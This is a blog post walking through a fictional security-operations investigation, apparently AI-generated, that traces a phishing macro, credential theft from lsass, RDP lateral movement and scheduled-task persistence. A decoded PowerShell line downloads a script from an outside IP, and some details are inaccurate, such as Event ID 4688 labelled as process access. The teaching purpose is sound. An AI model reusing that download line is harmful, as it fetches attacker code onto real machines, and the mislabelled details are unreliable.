    Not a Conversation, a New Case¶

    Bismillah, a new episode of the Cyber Security chats. Today we're picking up an INCIDENT and really understanding how to run an Investigation on it (mindset differs from analyst to analyst, but this is my current mindset, and of course if anyone has feedback to help me improve it, please go ahead).

    In this post we'll stick to a fictional scenario I asked the AI to build, just to figure out the best way to write these posts. Next time we start doing real reports.

    Enough intro, let's get into it.

    The Start¶

    At 2:14 AM, the EDR at some company fired an alert like this:

    "Suspicious PowerShell execution — the process used the -EncodedCommand parameter"

    And the machine the alert came from belongs to a sales employee named Ahmed.

    Who is Ahmed closing a four-million-pound deal with at 2 AM? 😅

    Let me think about this logically first: the time alone is already suspicious. Second, even if — hypothetically, for whatever reason — the employee was working, why would he have PowerShell access in the first place? Normally that's a locked-down privilege for a regular user.

    But wait, couldn't this be an IT Admin on a night shift making a change on a machine? Some of them are allowed to use PowerShell normally, right?

    Are you defending him now? 😂

    This brings us to the most important principle in the world of crime in general: the accused is innocent until proven guilty.

    Even in the SOC? Even in the SOC.

    Bottom line, the sentence that sums up the entire SOC field:

    Create justifications, then prove them wrong. (Within limits you'll learn with practice, of course.)

    We don't sit on one alert all day, but the short version is: if there's any legitimate use for what you're looking at, always try to prove it holds up — or that it's actually malicious.

    So now I have two working leads to start the investigation with, each with a hypothesis that could turn out to be legit.

    Starting the Investigation¶

    Bismillah, where do we start? We said we're not sure who logged onto the machine — IT admin or Ahmed?

    Let's start by reviewing the logon logs before 2:15 AM or so, and see how the session that ran PowerShell actually got established.

    We check the logon event logs (explained this in the last post, go check it out):

    Event ID 4624 (Successful Logon)

    The most important thing in this Event ID is the logon type, which tells me exactly how access to the machine happened — whether it's the user or someone else. The three most important types:

    • Type 2 = Interactive (someone physically sitting at the machine)
    • Type 3 = Network
    • Type 10 = RemoteInteractive (RDP)

    Result: we found Logon Type = 10 (RDP)

    Hold on — didn't we say this could be an IT admin logging in remotely, normal stuff?

    Well, if it's IT, the IP should be known, right? And they should've logged into this machine at least once before?

    Search on the SIEM — we found an internal IP that did log onto the machine, but with no prior history of ever connecting to this employee's machine.

    Search that IP in the EDR — turns out it belongs to a completely different sales employee's machine! (Now we're all in 😂)

    Containment is triggered immediately for the entire sales VLAN — we've confirmed there's unauthorized lateral movement.

    At some SOCs, an L1 analyst escalates here and their job on this case ends.

    But what if we keep going?

    Decoding the PowerShell Command¶

    Let's look at the PowerShell command that came in with the EDR alert.

    It was encoded, of course. Threw it into CyberChef, and got:

    $s = New-Object Net.WebClient
$s.DownloadFile('http://185.174.55.69/p.ps1', 'C:\Users\Public\svchost.ps1')

    So... it's downloading a file with a name that mimics a legit Windows service process, from an IP whose reputation on VT comes back malicious.

    Where did this come from though? We said another sales machine is the one that logged in — so how did the attacker even reach that first machine?

    Digging Into the Source Machine¶

    Let's dig into the source machine.

    Looking at its logs, we find an actual RDP log to the machine the alert came from.

    But where did they get the username and password for that first machine?

    We covered AD attack processes before, and mentioned that credentials get dumped from memory — but we never said exactly where they live.

    It's in lsass.exe, which holds all the logon credential data on a machine. That's exactly the first thing that should come to mind to search for.

    Let's search the SIEM, and we get a log like this:

    Event ID: 4688 (ProcessAccess)
Time: 11:41:03 PM
SourceImage: C:\Users\Public\update_svc.exe
TargetImage: C:\Windows\System32\lsass.exe
GrantedAccess: 0x1010

    And 0x1010 means read access into memory... exactly.

    Wait, that path again — Public\update_svc.exe? Meaning "update process," fine, could genuinely be some update tool (remember our line: create justifications?).

    But here's what we should already know: Windows services live in one of two paths, System32 or System. Finding it in a Public path is a red flag right there!

    So where did update_svc.exe come from? Was it downloaded?

    Tracing the Process Creation¶

    Let's search for its Process Creation log and see what it actually is:

    Event ID: 1 (Process Creation on Sysmon)
CommandLine: "C:\Users\Public\update_svc.exe"
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
ParentCommandLine: "WINWORD.EXE" /n "C:\Users\mona.adel\Downloads\Vendor_Invoice_Update.docm"

    The log tells us it was launched from WINWORD.EXE.

    A Word document, fine, could still be within legit territory — until we see where it came from:

    \Downloads\Vendor_Invoice_Update.docm

    Downloaded from a macro-enabled file? (.docm means macro-enabled). Took the shock there 😅

    Where from though?

    Search the system logs by filename — Event ID: 15 represents a stream that holds extra info Windows attaches to a file, and inside it there's a parameter called Zone.Identifier, which tells you whether the file came from outside, from local, or from the cloud.

    Event ID: 15
TargetFilename: C:\Users\mona.adel\Downloads\Vendor_Invoice_Update.docm
Hash: SHA256=...
Contents: [ZoneTransfer]
ZoneId=3
ReferrerUrl=https://mail.google.com/...

    We've got ZoneId=3 from mail.google.com.

    Hmm... phishing email, then.

    Back to the Mail Gateway¶

    Let's search the Mail Gateway for the email.

    Found a mail with the same hash as the macro file:

    Recipient: Amr.adel@delta.corp
Subject: Updated Vendor Invoice — Please Review
Attachment: Vendor_Invoice_Update.docm
Attachment Hash: SHA256=b7e2a9...f41c (same hash that showed up in Event ID 1)
SPF: Fail
DKIM: Fail
DMARC: Fail

    Failed every single mail reputation protocol, but got through because of a misconfiguration in the Mail Gateway rules.

    Now, we need to know exactly what this macro does, for the Eradication phase later.

    Take the macro's hash, run Static Analysis (VT) and Dynamic Analysis (Hybrid or Any.run) on it.

    We find it downloads a payload from the same external IP we saw earlier, and also creates a Scheduled Task.

    Persistence¶

    Search Event ID: 4698 (Scheduled Task) in the logs, and we actually find something:

    Task Content:
  <Exec>
    <Command>C:\Users\Public\update_svc.exe</Command>
  </Exec>
  <Trigger>
    <LogonTrigger>
    <Repetition><Interval>PT10M</Interval></Repetition>

    LogonTrigger (checks in online every ten minutes), under the name MicrosoftEdgeUpdateTaskMachine.

    We said that name looks legit at first glance — but the path isn't Public like we mentioned! It's the exact same path we already saw.

    Was There Any Data Leak?¶

    Now we need to know what the attacker did after all this. Did any data leak? Did they pull down anything bigger?

    Let's check the Firewall and EDR for data exfiltration.

    Found:

    185.174.55.69: Outbound bytes = 4.2 KB

    A small amount of data left from Amr's machine (the source machine that had the email) — likely just a beacon check-in (the machine "pinging" that it's alive, nothing more).

    Also found:

    185.174.55.69: Connection attempt to download p.ps1 → BLOCKED by EDR

    From the machine the original alert came from.

    That one would've been the follow-up stage — but it got stopped in time, alhamdulillah.

    Wrap-Up¶

    And with that, we're done, alhamdulillah. All that's left is figuring out how many machines are affected beyond Ahmed's and Amr's.

    We take this IP and run something called a Retro IOC — checking it against the rest of the fleet, to see if it has any footprint on the other sales machines or not.

    And that's it.

    If I got it right, it's from Allah; if I got it wrong, it's from myself and Shaytan 🤍
